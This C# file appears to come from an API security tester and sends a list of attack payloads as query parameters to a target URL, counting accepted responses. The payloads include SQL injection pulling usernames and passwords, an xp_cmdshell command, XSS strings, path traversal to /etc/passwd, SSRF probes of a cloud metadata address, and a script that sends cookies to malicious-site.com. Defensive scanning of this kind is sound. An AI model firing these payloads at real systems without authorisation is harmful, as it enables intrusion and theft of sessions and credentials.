namespace API_Tester;

public partial class MainPage
{
    /*
    Microsoft SDL Security Verification Testing Payloads

    Purpose:
    Provides predefined payloads for automated security verification testing 
    in accordance with the Microsoft Security Development Lifecycle (SDL) 
    guidelines, designed to simulate common input-based attacks and 
    verify the robustness of application input validation and security controls.

    Threat Model:
    Applications that do not properly validate or sanitize inputs may be 
    vulnerable to attackers who can:

        - Execute injection attacks (SQL, NoSQL, command injections)
        - Trigger cross-site scripting (XSS) vulnerabilities
        - Access sensitive files via path traversal
        - Exploit unhandled input processing flaws

    Common vulnerabilities include:

        - SQL or NoSQL injection
        - Cross-site scripting (XSS) attacks
        - Path traversal leading to unauthorized file access
        - Insufficient input validation or sanitization
        - Lack of defense-in-depth in input handling

    Test Strategy:
    The method returns an array of strings representing common attack payloads 
    that can be used to verify the security of input processing mechanisms. 
    The payloads are designed to:

        - Trigger potential injection vulnerabilities
        - Test for client-side or server-side script execution
        - Identify improper file path handling
        - Validate that input validation and sanitization mechanisms are effective

    Potential Impact:
    If input validation and security controls are insufficient, attackers may:

        - Compromise database integrity or access sensitive data
        - Execute scripts in users’ browsers (XSS)
        - Access unauthorized system files
        - Circumvent security policies and protections

    Expected Behavior:
    Applications should:

        - Properly validate and sanitize all user-supplied inputs
        - Prevent injection and script execution attacks
        - Restrict file access and prevent traversal attacks
        - Apply layered defenses and adhere to SDL best practices
    */
    
    private static string[] GetMicrosoftSdlSecurityVerificationTestingPayloads() =>
    [
        "' OR '1'='1",
        "{\"$where\":\"1==1\"}",
        "<script>alert(1)</script>",
        "../../windows/win.ini",
        "' UNION SELECT null, username, password FROM users --",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'; EXEC xp_cmdshell('dir') --",
        "'; ping 127.0.0.1; --",
        "../../../../etc/passwd",
        "<iframe src='javascript:alert(1)'></iframe>",
        "' OR 1=1--",
        "' OR 'a'='a' --",
        "<script>confirm('XSS');</script>",
        "' AND 1=0 UNION SELECT 1, username, password FROM users --",
        "<input type='text' value=''><script>alert(document.cookie)</script>",
        "http://localhost",
        "http://127.0.0.1",
        "http://169.254.169.254",
        "http://localhost:8080/admin",
        "http://10.0.0.1",
        "<script>alert(document.cookie);</script>",
        "<script>document.location='http://malicious-site.com?cookie=' + document.cookie;</script>",
        "'; SELECT * FROM information_schema.tables --",
        "<script>alert('XSS')</script>",
        "<script>document.location='http://malicious-site.com?cookie=' + document.cookie;</script>"
    ];

    private HttpRequestMessage FormatMicrosoftSdlSecurityVerificationTestingRequest(Uri baseUri, string payload)
    {
        var probeUri = AppendQuery(baseUri, new Dictionary<string, string>
        {
            ["input"] = payload,
            ["test"] = payload
        });
        return new HttpRequestMessage(HttpMethod.Get, probeUri);
    }

    private async Task<string> RunMicrosoftSdlSecurityVerificationTestingTestsAsync(Uri baseUri)
    {
        var payloads = GetMicrosoftSdlSecurityVerificationTestingPayloads();
        var findings = new List<string>();
        var accepted = 0;

        foreach (var payload in payloads)
        {
            var response = await SafeSendAsync(() => FormatMicrosoftSdlSecurityVerificationTestingRequest(baseUri, payload));
            findings.Add($"Payload '{payload}': {FormatStatus(response)}");
            if (response is not null && (int)response.StatusCode is >= 200 and < 300)
            {
                accepted++;
            }
        }

        findings.Insert(0, $"Payload variants tested: {payloads.Length}");
        findings.Add(accepted > 1
            ? $"Potential risk: weak verification controls on {accepted}/{payloads.Length} probes."
            : "No obvious verification-control weakness across tested payloads.");

        return FormatSection("Microsoft SDL Security Verification Testing", baseUri, findings);
    }
}
